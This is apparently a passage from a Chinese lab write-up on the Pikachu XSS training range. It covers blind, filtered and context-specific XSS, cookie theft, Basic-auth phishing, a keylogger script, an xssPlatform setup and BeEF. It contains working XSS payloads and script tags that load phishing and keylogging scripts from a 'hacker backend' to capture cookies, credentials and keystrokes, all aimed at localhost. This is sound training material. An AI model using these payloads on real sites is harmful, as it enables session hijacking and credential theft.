<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613212733311.png" alt="image-20230613212733311"></p>
<p>题外话：</p>
<p>由于本关payload在url中，因此比第4关好利用很多<br>
DOM型XSS只在前端，与后端毫无关系。DOM-X型危害更大，它能够像反射型一样在URL中体现，将URL发给了受害者就能进行攻击。</p>
<h3 id="0x06-XSS-Blind">0x06-XSS(Blind)</h3>
<p>进入第六关后发现是一个留言板，随便输入点东西，提交之后发现输入的东西完全不显示在页面上，去哪儿了呢？</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213010680.png" alt="image-20230613213010680"></p>
<p>查看网页源代码之后，发现本关的输入是以POST方法提交的，但是form标签里没有action属性，也不知道表单数据被提交到哪里去了呀。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213027969.png" alt="image-20230613213027969"></p>
<p>查看提示让我们登录后台地址看看(原来这关需要登录才能进行xss利用)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213107175.png" alt="image-20230613213107175"></p>
<p>跳转到所给页面后，通过提示给的账号密码进行登录(admin,123456)</p>
<p>登录后发现我们之前输入的内容已经记录在后台</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213239474.png" alt="image-20230613213239474"></p>
<p>而且内容和用户名都有显示，所以对两个输入框都进行测试<br>
输入Payload:</p>
<pre><code class="hljs plaintext">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213331253.png" alt="image-20230613213331253"></p>
<p>登录后台，发现输入的Payload触发了两次，所以说明两个输入框都存在xss注入</p>
<h4 id="什么是xss盲打？-XSS-Blind">什么是xss盲打？(XSS-Blind)</h4>
<p>简单来说，盲打就是在一切可能的地方尽可能多的提交xss语句，然后看哪一条会被执行，就能获取管理员的cooike。趁着没过期赶紧用了，这样就能直接管理员进后台。然后再上传一句话，大马最终渗透进内网。</p>
<p>​    盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言啊，feedback啊之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。</p>
<p>​    “xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。</p>
<p>​    通俗讲就是见到输入框就输入提前准备的xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。</p>
<pre><code class="hljs plaintext">也就是说我们输入的字符并不会在前端输出   

只有他的管理员才能看到我们输入的内容      前端用户是看不到的             

如果说管理员登陆后台之后  后台界面会把我们输入的内容进行输出的话  就意味着后台的管理人员会被x到

如果真的会被x到  那么这种场景的xss就叫xss的盲打</code></pre>
<h3 id="0x07-XSS-过滤">0x07-XSS-过滤</h3>
<p>随便输入一些内容，提交之后发现页面有回显输入的内容，url中也有输入的内容，离开本页面再回来，页面就没有这个内容了，说明是反射型GET型XSS</p>
<p>先用<code>&lt;script&gt;alert(123)&lt;/script&gt;</code>尝试,发现被过滤了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213738585.png" alt="image-20230613213738585"></p>
<p>那我们测试一下哪些没被过滤吧</p>
<p>猜测一下可能有：&quot;,&lt;,&gt;,',on/`() script img href src</p>
<p>可以把这些一个个输入提交试试，也可以一起提交，然后就发现了好玩的情况，如果单独输入&quot;&lt;&gt;‘on/’()则什么都没有被过滤，如果输入了&quot;&lt;&gt;‘on/’() script img href src，则&lt;&gt;‘on/’() script被删掉了，这说明什么问题？这说明过滤语句可能是&lt;script</p>
<p>那我们尝试换标签</p>
<pre><code class="hljs plaintext">&lt;a herf=&quot;#&quot; onclick=&quot;alert(document.cookie)&quot;&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214421855.png" alt="image-20230613214421855"></p>
<p>当然还有很多标签,可以自行尝试</p>
<h3 id="0x08-XSS-htmlspecialchars">0x08-XSS-htmlspecialchars</h3>
<p>先输入个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，理所当然没有弹框，出现了一个链接（箭头部分），根据之前的经验，这里应该是有个<code>&lt;a&gt;</code>标签</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214542721.png" alt="image-20230613214542721"></p>
<p>查看源代码发现如下<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214601015.png" alt="image-20230613214601015"></p>
<p>很明显这里&lt;和&gt;都被编码了</p>
<p>发现不管是<code>&lt;a&gt;</code>标签内还是href属性内，左右尖括号被编码了，因此这关想闭合标签是不行了。仔细一看，又发现单引号居然没有被html编码，可以可以，利用一下<code>&lt;a&gt;</code>标签吧。</p>
<pre><code class="hljs plaintext">输入Payload:
#&#x27; onclick=&#x27;alert(document.cookie)&#x27;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214827824.png" alt="image-20230613214827824"></p>
<h3 id="0x09-XSS-href输出">0x09-XSS-href输出</h3>
<p>还是先输入个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，没有弹框</p>
<p>鼠标右键–查看网页源代码，发现左右尖括号和单引号都被html编码了，这样的话，闭合标签或者闭合属性都行不通了。</p>
<p>但也不是没办法了，W3School中对<a>标签的href属性有以下描述（引用摘自HTML <a>标签的 href 属性）：</p>
<pre><code class="hljs plaintext">&lt;a&gt;标签的 href 属性用于指定超链接目标的 URL。

href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了&lt;a&gt;标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。</code></pre>
<p>从上述描述可见，这边可以利用JavaScript协议。输入<br>
payload：</p>
<pre><code class="hljs plaintext">javascript:alert(document.cookie)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215618484.png" alt="image-20230613215618484"></p>
<p>思考：</p>
<p>那么当用户输入由href属性输出时，该怎么防御xss呢？</p>
<p>仅仅html编码就不够了，本关的php源代码中给了提示（有点简略，这里稍微扩充一点）。遇到这种情况，需要两点处理：</p>
<p>1、检查用户输入，必须以http或者https开头。注意，不可以仅仅是包含http和https。</p>
<p>2、进行html实体编码<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215657023.png" alt="image-20230613215657023"></p>
<h3 id="0x10-XSS-js输出">0x10-XSS-js输出</h3>
<p>还是输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，果不其然没有弹框</p>
<p>鼠标右键–查看网页源代码，刚刚输入的东西跑到<code>&lt;script&gt;</code>标签内了，并且没有被编码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220200088.png" alt="image-20230613220200088"></p>
<p>接下来就很简单了，只要无中生有出一个js语句就好了，首先要用’;闭合掉当前的语句，然后插入新语句，然后再用//注释掉老语句遗留下来的’;</p>
<p>输入payload：<code>';alert(1);//</code></p>
<p>成功弹窗</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220441105.png" alt="image-20230613220441105"></p>
<p>也可以</p>
<p>直接可以输入<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，得到弹窗：</p>
<p>查看php，这里的关键是JS的输出点应该使用\对特殊字符进行转义：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220758486.png" alt="image-20230613220758486"></p>
<p>总结：<br>
1、在不知道它过滤了什么的情况下，可以用**&quot;&lt;&gt;'on/`() script img href src**等字符<br>
2、用htmlspecialchars进行过滤，默认情况下没有过滤单引号。<br>
3、在a标签的href中可以利用JavaScript协议执行js语句。在有输入接口，并且将输入内容直接赋值给变量的，可以构造闭合来执行恶意js代码。</p>
<h3 id="0x11-XSS-get-cookie">0x11-XSS-get_cookie</h3>
<p>简述一下XSS获取cookie的过程</p>
<pre><code class="hljs plaintext">用户  用浏览器  访问存在xss漏洞的站点

站点  返回给浏览器的  数据带有  恶意js代码

用户  浏览器执行  js代码  要求  发送cookie给  攻击者

攻击者伪造用户登录站点，造成破环</code></pre>
<p>相比于GET方式，黑客通过POST方式窃取Cookie更加神不知鬼不觉，这里来复现一下</p>
<p>首先需要搭建一个收集Cookie的后台。这里Pikachu已经为我们准备好了，只需要在左侧管理工具栏进入XSS后台，点击初始化</p>
<p>修改IP地址。打开Pikachu/pkxss/xcookie/post.html文件，因为这里是在本地演示，因此2个IP都修改为127.0.0.1，通过目录来区分漏洞网站和黑客后台。如果是在多台虚拟机中进行实验，即将第1处修改为漏洞网站IP，第2个处修改为黑客后台IP即可</p>
<p>这里我用服务器演示吧(pikachu自带后台出问题了)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614104228257.png" alt="image-20230614104228257"></p>
<p>注:图片的第二个ip后面应加一个5555端口,我忘记了,此时，打开一个浏览器来模拟用户。先访问</p>
<pre><code class="hljs plaintext">http://127.0.0.1/pikachu/vul/xss/xsspost/post_login.php</code></pre>
<p>并使用另一个账号test/abc123登陆</p>
<p>在用户浏览器中访问黑客伪造的post.html站点：</p>
<pre><code class="hljs plaintext">http://127.0.0.1/pikachu/pkxss/xcookie/post.html</code></pre>
<p>这里呢我就直接借用登录后的输入框来当做点击恶意站点了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105256890.png" alt="image-20230614105256890"></p>
<p>此时，黑客可以在XSS后台看到窃取到的Cookie。黑客浏览器访问后台：</p>
<pre><code class="hljs plaintext">http://127.0.0.1/pikachu/pkxss/xcookie/pkxss_cookie_result.php</code></pre>
<p>这里我直接用服务器监听5555端口,用户点击发送后我这里就能看到cookie了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105134632.png" alt="image-20230614105134632"></p>
<p>这里是用自带的后台所获取的(这里修改好了,原因在于url错误少了pikachu)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110625908.png" alt="image-20230614110625908"></p>
<h3 id="0x12-XSS-fish">0x12-XSS-fish</h3>
<p><strong>简述一下钓鱼攻击</strong></p>
<pre><code class="hljs plaintext">用basic认证实现钓鱼场景

在实际的攻击场景当中  xss钓鱼的场景非常多   可以内嵌一些钓鱼页面  或者钓鱼链接

这里用basic认证实现钓鱼

在存在xss漏洞的页面  内嵌一个请求（javascript或者其他）

当用户打开了嵌入恶意代码的页面之后   页面会向远端的  后台（pkxss去发送一个请求）

这个请求会返回一个要求他进行bacis认证的头部    在用户界面上就会弹出一个要进行身份认证的提示框     一旦他输入了账号密码   这个账号密码就会发送到我们的pkxss后台</code></pre>
<p>黑客可以在有存储型XSS漏洞的网站中嵌入一个恶意JS，当用户访问该站点时自动触发，而在黑客后台向用户返回一个要求Basic认证的头部，那么此时用户界面就会弹出一个身份认证的提示框。如果用户防范意识不高，在提示框中输入了网站的账号密码，那么该账号密码就会被发送到黑客后台。</p>
<p>Pikachu靶场同样准备好了钓鱼的文件，只需要修改IP地址即可。打开Pikachu/pkxss/xfish/fish.php文件，将IP地址修改为黑客后台地址，注意IP地址后面需要添加上/pikachu/目录，还有需要注意的是header(Location: …)此句，将换行删除，否则无法跳转。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110911065.png" alt="image-20230614110911065"></p>
<p>然后在黑客浏览器中访问存储型XSS页面，插入恶意代码</p>
<pre><code class="hljs plaintext">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111025197.png" alt="image-20230614111025197"></p>
<p>打开另一个浏览器模拟普通用户，访问存储型XSS页面：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/xss/xss_stored.php">http://127.0.0.1/pikachu/vul/xss/xss_stored.php</a>。此时页面会弹出一个Basic认证提示框，模拟用户输入账号密码，点击确定</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111350817.png" alt="image-20230614111350817"></p>
<p>这一步有个坑就是Basic认证后不跳转，而是一直在弹认证提示框。尝试过修改修改PHP版本、修改pkxss路径、使用2台虚拟机分别搭建漏洞网站和黑客后台环境等等方法都不行，无奈最终使用作弊的方法写入：将下面语句插入存储型XSS处，然后使用用户浏览器访问</p>
<pre><code class="hljs plaintext">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/xfish.php?username=naraku&amp;password=1234&quot;&gt;&lt;/script&gt;</code></pre>
<p>上面这个坑后来找到了原因：<strong>PHP 的 HTTP 认证机制仅在 PHP 以 Apache 模块方式运行时才有效，因此该功能不适用于 CGI 版本</strong>，我这里使用的是phpStudy搭建的环境，默认是以CGI版本运行PHP。后续通过重新搭建环境解决此问题。</p>
<p>此时，黑客可以在XSS后台的钓鱼记录处看到用户输入的账号密码(这里我没有解决)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111443421.png" alt="image-20230614111443421"></p>
<h3 id="0x13-XSS-键盘记录">0x13-XSS-键盘记录</h3>
<pre><code class="hljs plaintext">跨域：
当协议、主机(主域名，子域名)、端口中的任意一一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。

跨域同源策略

出于安全考虑，所有的浏览器都约定了&quot;同源策略&quot;， 同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。

如果想要跨域操作,则需要管理员进行特殊的配置。
比如通过: header( &quot;Access -Control Allow- Origin:x.com&quot; )指定</code></pre>
<p>打开pikachu/pkxss/rkeypress/rk.js文件，将第54行语句并修改为黑客后台地址：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111609567.png" alt="image-20230614111609567"></p>
<p>浏览器进入存储型XSS漏洞：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/xss/xss_stored.php">http://127.0.0.1/pikachu/vul/xss/xss_stored.php</a>，插入恶意代码rk.js</p>
<pre><code class="hljs plaintext">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></pre>
<p>另开一个浏览器模拟普通用户进入该漏洞页面，任意输入一些字符，无需点击提交</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111808477.png" alt="image-20230614111808477"></p>
<p>这里不知为何js代码的event函数失效,暂时解决不了,太菜了,日后有缘再见</p>
<h3 id="0x14-自搭xssPlatform">0x14-自搭xssPlatform</h3>
<p>参考:<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021899373">https://segmentfault.com/a/1190000021899373</a></p>
<p>这里不用管127.0.0.1与xss.localhost的映射</p>
<h4 id="1-数据库搭建">1. 数据库搭建</h4>
<p>xssPlatform渗透测试系统使用的数据库是MySQL，因此笔者需要先安装mysql数据库服务，为了简化安装，便直接使用了docker方式进行，参考命令如下</p>
<pre><code class="hljs plaintext">docker run --name mysqlserver -e MYSQL_ROOT_PASSWORD=123 -d -i -p 3309:3306  mysql:5.6</code></pre>
<h4 id="2-xssPlatform搭建">2. xssPlatform搭建</h4>
<p>在安装完MySQL服务之后，便可以安装xssPlatform系统了，笔者已经将所需PHP和nginx环境封装好了，因此只需下载镜像运行即可</p>
<h5 id="2-1-运行容器">2.1 运行容器</h5>
<p>在运行容器时候需要考虑两个问题，首先需要将web端口映射出来宿主机才可以访问，第二个是需要考虑此容器要能访问得到mysql服务，因此参考命令如下：</p>
<pre><code class="hljs plaintext">docker run --name xssPlatform_test --link mysqlserver:db  -d -i  -p 8888:80   daxia/websafe:latest</code></pre>
<h5 id="2-2-启动服务">2.2 启动服务</h5>
<p>在启动容器之后，通过浏览器访问<code>http://xss.localhost:8888/</code>不能打开，原因是因为容器里的<code>nginx</code>服务和<code>PHP</code>服务都还未启动，<code>首次</code>启动的命令参考如下所示：</p>
<pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> xssPlatform_test zsh -c <span class="hljs-string">&quot;php /root/start.php&quot;</span></code></pre>
<p>此时再通过浏览器访问<code>http://xss.localhost:8888/</code>，便可以打开安装协议页面，如下图所示</p>
<blockquote>
<p>如果是重启容器后,需要启动XSS平台,则用一下命令免得重新安装<br>
<code>docker exec xssPlatform_test zsh -c &quot;/usr/sbin/php-fpm7.2 -R &amp;&amp; nginx&quot;</code></p>
</blockquote>
<h5 id="2-3-系统安装">2.3 系统安装</h5>
<p>安装过程比较简单，但在填写数据库地址的时候需要注意，我们已经将mysqlserver链接到了xssPlatform容器当中，此时数据库地址直接填写<code>db</code>即可,数据库密码笔者在启动MySQL容器时设置的为<code>123</code>，这里也填写<code>123</code>数据库名称为permeate_test</p>
<p>通过前面添加虚拟主机和添加host解析之后，便可以通过浏览器访问此平台，URL地址为<code>http://xss.localhost:8888/</code>,打开后会自动跳转到安装界面，如下图所示</p>
<p><strong>伤心的是这个配置文件似乎问题好多,我暂时不想解决了…(日后有缘再见)</strong></p>
<p>可以参考另一个平台的配置(说不定日后还是用的到)</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12176961.html">https://www.cnblogs.com/Cl0ud/p/12176961.html</a></p>
<h3 id="0x15-kali-beef-xss">0x15-kali beef-xss</h3>
<h4 id="15-1-BeEF简介">15.1 BeEF简介</h4>
<p>BeEF是The Browser Exploitation Framework的缩写。它是一种专注于Web浏览器的渗透测试工具。</p>
<p>beef管理，挂钩web浏览器的过程：</p>
<pre><code class="hljs plaintext">什么是hook?

在windows系统中，一切皆消息，比如按了一下键盘，也是一个消息，Hook的意思是勾住，也就是在消息过去之前，可以先把消息勾住，不让其传递，你可以优先处理，也即这项技术就是提供了一个入口，能够针对不同的消息或者API在执行前，先执行你的操作，你的操作也称为「钩子函数」，所以，有的时候程序员在讨论的时候，也经常会说，可以先hook住，在处理，也即在执行某某操作之前，优先处理一下</code></pre>
<pre><code>生成交互 payload 的 hook；
服务器端：beef 作为服务端管理，管理访问运行了 hook 的客户端；
